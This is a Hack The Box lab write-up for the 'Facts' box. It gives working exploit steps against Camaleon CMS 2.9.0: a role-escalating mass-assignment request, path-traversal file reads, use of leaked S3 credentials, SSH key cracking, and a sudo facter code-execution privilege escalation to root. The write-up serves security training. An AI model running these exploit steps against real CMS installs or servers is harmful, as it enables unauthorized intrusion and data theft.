---
title: "Facts"
platform: "HTB"
difficulty: "Easy"
os: "Linux"
date: 2026-02-07
status: "rooted"
user_flag: true
root_flag: true
tags: [web, cve, mass-assignment, path-traversal, s3, ssh-key-cracking, sudo-facter]
tools: [nmap, curl, aws-cli, ssh2john, john, ssh]
ttl: "3h 30m"
---

Facts is a Linux box running Camaleon CMS 2.9.0 on Ruby on Rails behind nginx. The attack chain involves mass assignment to escalate to CMS admin, path traversal to read files, S3 credential extraction from CMS settings to recover an encrypted SSH key, cracking the passphrase, and finally abusing a sudo-allowed `facter` binary with a custom Ruby fact to get root.

## Reconnaissance

### Port Scan

```
# Nmap 7.94SVN scan initiated Sat Feb  7 10:14:31 2026
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2
| ssh-hostkey:
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
```

Two ports — SSH and HTTP. Nmap reveals a redirect to `facts.htb`, so we add it to `/etc/hosts`.

### Service Enumeration

Browsing `http://facts.htb/` lands on a Camaleon CMS instance. The footer and meta tags reveal **Camaleon CMS 2.9.0** running on Ruby on Rails. The CMS has a public registration page.

## Initial Foothold

### Account Registration

Register a standard user account on the CMS. Login and note the session structure — Rails CSRF tokens are embedded in every form as `authenticity_token`.

### CMS Admin Escalation — CVE-2025-2304

**Vulnerability**: Mass assignment in the Camaleon CMS user update endpoint allows any authenticated user to escalate their role to admin.

The user profile update endpoint at `/admin/users/<user_id>/updated_ajax` accepts nested parameters under the `password[...]` namespace. Rails mass assignment allows injecting the `role` parameter alongside legitimate fields.

```bash
curl -s -b cookies.txt -c cookies.txt \
  -X POST "http://facts.htb/admin/users/3/updated_ajax" \
  -d "_method=patch" \
  -d "authenticity_token=<token>" \
  -d "password[password]=newpass123" \
  -d "password[password_confirmation]=newpass123" \
  -d "password[role]=admin"
```

Key Rails details:
- `_method=patch` — Rails uses hidden fields to simulate PATCH requests via POST
- Parameters are nested under `password[...]` — Rails convention for strong params bypass
- A valid CSRF token must be extracted from any page first

After re-logging in, full admin panel access is confirmed at `/admin/`.

## User Flag — CVE-2024-46987

### Path Traversal

**Vulnerability**: Camaleon CMS 2.9.0 has an arbitrary file read via path traversal in the media download endpoint.

```
GET /admin/media/download_private_file?file=../../../../etc/passwd
```

The traversal reads files as the Rails application user (`trivia`, uid 1000). Enumerating `/etc/passwd` reveals two interesting users:

```
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```

Reading the user flag directly:

```
GET /admin/media/download_private_file?file=../../../../home/william/user.txt
```

### User Flag
```
8737cebbcded73fc722258510a148e1c
```

Note: `/home/trivia/user.txt` returns 500 (wrong permissions), and SSH private keys are also not world-readable — so we need another path to get a shell.

## Privilege Escalation

### S3 Discovery via nginx Config

The path traversal lets us read the nginx configuration:

```
GET /admin/media/download_private_file?file=../../../../etc/nginx/sites-enabled/facts.htb
```

This reveals a LocalStack S3 service running on `127.0.0.1:54321`, proxied publicly at the `/randomfacts/` path. So S3 is accessible from outside the box.

### S3 Credential Extraction

Browsing the CMS admin settings page at `/admin/settings/site` reveals stored AWS/S3 credentials:

| Setting | Value |
|---------|-------|
| S3 Access Key | `AKIA44284CF85C8A473F` |
| S3 Secret Key | `i6bDrNbDm+1o6CuZGnTdzskWNrMcEX0SplL3sfPL` |
| S3 Bucket | `randomfacts` |
| S3 Endpoint | `http://localhost:54321` |

Alternatively, these can be extracted from the SQLite database at `storage/production.sqlite3` via path traversal, querying the `cama_metas` table.

### S3 Enumeration

Using the AWS CLI against the target's S3 endpoint:

```bash
export AWS_ACCESS_KEY_ID=AKIA44284CF85C8A473F
export AWS_SECRET_ACCESS_KEY='i6bDrNbDm+1o6CuZGnTdzskWNrMcEX0SplL3sfPL'

# List all buckets
aws --endpoint-url http://10.129.221.84:54321 s3 ls
# 2026-01-01 00:00:00 randomfacts
# 2026-01-01 00:00:00 internal

# List the internal bucket
aws --endpoint-url http://10.129.221.84:54321 s3 ls s3://internal/
# PRE .ssh/

aws --endpoint-url http://10.129.221.84:54321 s3 ls s3://internal/.ssh/
# id_ed25519
```

An SSH private key stored in the `internal` bucket.

### SSH Key Extraction & Cracking

```bash
aws --endpoint-url http://10.129.221.84:54321 s3 cp s3://internal/.ssh/id_ed25519 ./key
chmod 600 ./key
```

The key is encrypted (aes256-ctr, bcrypt KDF). Checking the bcrypt rounds — only **24 rounds**, which is trivially weak.

```bash
ssh2john key > key.hash
john key.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Passphrase cracked: **`dragonballz`** (found at position ~3186 in rockyou.txt).

### SSH Access

```bash
ssh -i key trivia@facts.htb
# Passphrase: dragonballz
```

Shell as `trivia`.

### Root via Facter (sudo)

Checking sudo permissions:

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/facter
```

**Facter** is Puppet's system fact-gathering tool (v4.10.0), written in Ruby. The `--custom-dir` flag lets us load arbitrary Ruby fact files that execute as root.

```bash
mkdir -p /tmp/priv
cat > /tmp/priv/rootflag.rb << 'EOF'
Facter.add(:rootflag) do
  setcode do
    Facter::Core::Execution.execute("cat /root/root.txt")
  end
end
EOF
sudo /usr/bin/facter --custom-dir /tmp/priv rootflag
```

### Root Flag
```
72b7b88355ac54e7a3be8d11e260e8c3
```

## Lessons Learned

### What Worked
- Reading the nginx config via path traversal to discover the hidden S3 service — this was the pivot point from "file read" to "credential access"
- Systematic bucket enumeration — the `internal` bucket wasn't referenced anywhere in the CMS, only discoverable via `aws s3 ls`
- Recognizing bcrypt with 24 rounds as trivially crackable — john handled it in seconds with rockyou

### What Failed
- Initially tried to read SSH keys directly via path traversal — they return 500 because they aren't world-readable by the Rails user
- Tried `/home/trivia/user.txt` first — 500, wrong permissions; the flag was in william's home

### Key Takeaways
- **Mass assignment in Rails** is still a real attack vector — always check if you can inject additional parameters in update endpoints, especially `role` fields
- **CMS admin panels often store cloud credentials** in settings pages — always check after gaining admin access
- **LocalStack S3 behind nginx** is a common pattern in CTFs — read the nginx config to discover proxied services
- **Facter + sudo** is a GTFOBins-style privesc — any Ruby-based tool with `--custom-dir` or plugin loading is exploitable via arbitrary code execution
- **bcrypt rounds matter** — 24 rounds is negligible; production systems use 10+ (meaning 1024+ actual rounds)
